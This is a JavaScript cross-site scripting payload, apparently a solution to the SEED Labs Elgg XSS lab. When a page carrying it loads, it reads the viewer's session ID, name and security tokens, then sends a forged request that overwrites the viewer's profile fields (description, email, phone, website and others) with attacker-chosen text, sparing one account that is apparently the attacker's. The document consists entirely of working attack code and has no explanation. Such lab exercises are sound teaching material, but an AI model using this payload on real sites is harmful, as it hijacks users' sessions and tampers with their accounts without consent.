<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token

        var guid = elgg.session.user.guid;
        var name = elgg.session.user.name;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;


        //Construct the content of your url.
        var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
        var content= token + ts + "&name=" + name; //FILL IN
        var random_string = "Bobby"

        content += '&description=1905119&accesslevel%5Bdescription%5D=1';
        content += '&briefdescription='+random_string+'&accesslevel%5Bbriefdescription%5D=1'
        content += '&location='+random_string+'&accesslevel%5Blocation%5D=1'
        content += '&interests='+random_string+'&accesslevel%5Binterests%5D=1'
        content += '&skills='+random_string+'&accesslevel%5Bskills%5D=1'
        content += '&contactemail='+random_string+'%40gmail.com&accesslevel%5Bcontactemail%5D=1';
        content += '&phone='+random_string+'&accesslevel%5Bphone%5D=1';
        content += '&mobile='+random_string+'&accesslevel%5Bmobile%5D=1';
        content += '&website=http%3A%2F%2Fwww.'+random_string+'.com&accesslevel%5Bwebsite%5D=1';
        content += '&twitter='+random_string+'&accesslevel%5Btwitter%5D=1';
        content += '&guid='+guid;   
        
        if(guid != 59)
        {
            //Create and send Ajax request to modify profile
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST",sendurl,true);
            Ajax.setRequestHeader("Host","www.seed-server.com");
            Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
            Ajax.send(content);
        }
	}
</script>